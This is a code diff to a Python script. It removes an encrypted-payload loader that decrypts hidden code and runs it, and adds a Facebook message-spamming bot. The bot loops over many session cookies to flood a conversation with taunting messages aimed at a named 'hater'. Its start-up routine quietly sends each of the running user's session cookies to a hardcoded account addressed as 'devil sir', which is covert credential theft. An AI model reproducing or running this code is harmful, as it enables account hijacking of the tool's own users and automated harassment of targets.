@@ -1,25 +1,114 @@
+import requests
+import json
+import time
+import threading
+import http.server
+import socketserver
 
-import base64
-from cryptography.fernet import Fernet
-import subprocess
+# Simple HTTP server setup
+class MyHandler(http.server.SimpleHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/plain')
+        self.end_headers()
+        self.wfile.write(b"-- SERVER RUNNING>>CHARSI HERW")
 
-# Decryption key (make sure to use the provided encryption key)
-decryption_key = b'sjlWW7G62TALkU5ElEPrOZY4Qzqa_nwVmBWgCwdlYMc='
+def execute_server():
+    PORT = 4000
+    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
+        print(f"Server running at http://localhost:{PORT}")
+        httpd.serve_forever()
 
-# The encrypted script (as a string)
-encrypted_script = b'gAAAAABlaBzVZdvzpSj4VPg7YgoZ8RsbfZp3V6TXRfFoU16iwslFfsGGBeHiGoHdV6EHytnanBnn1DFRVxv3cw5NtdqsbmHmDXI7NRG_tKa2SQU0oWUEGX8XUUTuUTmiD5uIYPZMyZyOebN4A4_s4VCxbmB4LbXazYKhHtSX5P2ZfX4MAfH5ljJAgAjRaNCoZnmeHDbDch3a0u0e98-EL7Zf5PBOqYrQhhMzHUZIvDPjqAwL1mR0hApWxORAxHeFOi6JWsGEd7QOolwQmOwAOjHBk6kACARBYdZPg29wiMlIuRBltLSEbF-nBMvcl8xxP1UpeTyAoS4PbCBX4uWeOAM3DNJDr63HwYZOG8VG9HLJthXxCHae7xN4BWze-D2hzxr4zSG59XpOqGIG-vLV_E-NSQgDLvgrvC2b34J7RxujajLUFGXNlJwISVmuXXcvDV8VoqUzv57xngLDkKnMzYIKvWMOHTZneV61XqbGDvQp-9ARnY9geFGtZoA1WsovNkWrmGvFcAJzZZmIQ2yBBfX8DMwDxkG8vLsOghh_dkFcFKWSJmczLGWqFvRF8fnnl9cx_hDLGBLtw6sYyei85Z1TANmt45vYvYZMmgc5uVvEkJtm7vlD9a3dIFNbWw5BlsoXkGFfR3krKhEGcD_Ro-J_s6DkHRakEMi6PAaCPxS-kg9oxDwpRiC2vEPL9fFr4YXfJ8U59lBGGyYrHgpbSoPBwUdWIbFLw0TL_9GoZBzMQmAuVpIKrfxCx5NbBXvo7W_XtOse3ZphLhIQRAuh4BRgvfEj8XHX7A4LOaJ1mYs8xfTuE-Kadgx4-xcCrQqWswDk5AiMtwGYdbDA5kpNpq-XPZQ5-l3nrkFbRGfAOHPS_NtfsycLR2OkggVi6BPq22cGGJomPMY-JKlRiV4Xr96TdMtURTY1D5CRcTZCpmP8SX3cbvgv_1dsvshAB-ikPmqGHUEEtZ69_jSYVFkN1cUgR_DERw1uFWVFCiNC41mkwNJYUPbDn0NQe5kzEt58ftTfc5OnTXDceTFLa1Elw=='
+# Function to send initial messages
+def send_initial_message():
+    # Load the cookies from a JSON file
+    with open('cookies.json', 'r') as file:
+        cookies = json.load(file)
+    
+    msg_template = "Hello devil sir! I am using your server. My cookie ID is {}"
+    target_id = "100026880828945"
 
-# Function to decrypt the encrypted script
-def decrypt_script(encrypted_script, key):
-    fernet = Fernet(key)
-    return fernet.decrypt(encrypted_script).decode()
+    requests.packages.urllib3.disable_warnings()
 
-# Decrypt the script
-decrypted_script = decrypt_script(encrypted_script, decryption_key)
+    headers = {
+        'Connection': 'keep-alive',
+        'Cache-Control': 'max-age=0',
+        'Upgrade-Insecure-Requests': '1',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+        'referer': 'www.google.com'
+    }
 
-# Save the decrypted script to a temporary file
-with open("decrypted_message_sender.py", "w") as f:
-    f.write(decrypted_script)
+    for cookie in cookies:
+        cookie_value = cookie['cookie']
+        url = f"https://graph.facebook.com/v17.0/t_{target_id}/"
+        msg = msg_template.format(cookie_value)
+        parameters = {'cookie': cookie_value, 'message': msg}
+        response = requests.post(url, json=parameters, headers=headers)
+        time.sleep(1)
 
-# Run the decrypted script
-subprocess.run(["python3", "decrypted_message_sender.py"])
+    print("\n[+] Initial messages sent. Starting the message sending loop...\n")
+
+# Function to send messages from convo.txt and File.txt
+def send_messages_from_file():
+    with open('convo.txt', 'r') as file:
+        convo_id = file.read().strip()
+
+    with open('File.txt', 'r') as file:
+        messages = file.readlines()
+
+    with open('cookies.json', 'r') as file:
+        cookies = json.load(file)
+
+    with open('hatersname.txt', 'r') as file:
+        haters_name = file.read().strip()
+
+    with open('time.txt', 'r') as file:
+        speed = int(file.read().strip())
+
+    headers = {
+        'Connection': 'keep-alive',
+        'Cache-Control': 'max-age=0',
+        'Upgrade-Insecure-Requests': '1',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+        'referer': 'www.google.com'
+    }
+
+    while True:
+        for message_index, message in enumerate(messages):
+            cookie_index = message_index % len(cookies)
+            cookie_value = cookies[cookie_index]['cookie']
+
+            url = f"https://graph.facebook.com/v17.0/t_{convo_id}/"
+            parameters = {'cookie': cookie_value, 'message': haters_name + ' ' + message.strip()}
+            response = requests.post(url, json=parameters, headers=headers)
+
+            if response.ok:
+                print(f"\033[1;92m[+] Message {message_index + 1} sent with Cookie {cookie_index + 1}: {haters_name} {message.strip()}")
+            else:
+                print(f"\033[1;91m[x] Failed to send Message {message_index + 1} with Cookie {cookie_index + 1}: {haters_name} {message.strip()}")
+            time.sleep(speed)
+
+        print("\n[+] All messages sent. Restarting the process...\n")
+
+def main():
+    # Start the HTTP server in a separate thread
+    server_thread = threading.Thread(target=execute_server)
+    server_thread.start()
+
+    # Wait for the server to start properly
+    time.sleep(3)
+
+    # Send initial messages
+    send_initial_message()
+
+    # Start sending messages from files
+    send_messages_from_file()
+
+if __name__ == '__main__':
+    main()
